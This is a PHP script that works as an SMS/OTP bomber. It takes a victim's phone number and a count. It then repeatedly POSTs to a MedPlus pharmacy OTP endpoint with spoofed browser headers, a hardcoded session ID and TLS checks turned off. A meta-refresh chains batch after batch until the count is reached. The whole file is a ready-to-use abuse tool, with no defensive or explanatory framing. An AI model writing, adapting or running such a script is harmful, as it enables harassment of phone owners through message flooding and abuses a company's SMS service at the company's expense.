
<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent>=$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	$cansend=5;
for ($i=0;$i<=$cansend;$i++){
$data="MOBILE_NUMBER=".$mobno."&SESSIONID=CF5225DBEEAB539F575C3B731B2F24E1&isCordova=false";
 $url="https://mobile.medplusindia.com/mobilemvc/sms/v2/getOtp.mbl";
         //header here
         $headers   = array();
        $headers[] = "Host:mobile.medplusindia.com";
		$headers[] = "content-length:83";
		$headers[] = "accept:application/json, text/plain, */*";
		$headers[] = "user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
		$headers[] = "content-type:application/x-www-form-urlencoded";
		$headers[] = "origin:https://www.medplusmart.com";
		$headers[] = "sec-fetch-site:cross-site";
		$headers[] = "sec-fetch-mode:cors";
		$headers[] = "sec-fetch-dest:empty";
		$headers[] = "accept-encoding:gzip, deflate, br";
		$headers[] = "accept-language:en-US,en;q=0.9";
        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);


    

}
	//code in for loop 
	$sentinc=$sent+$cansend;
   $rl="fast6.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
  
	?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="1; '.$rl.'">';
}
?>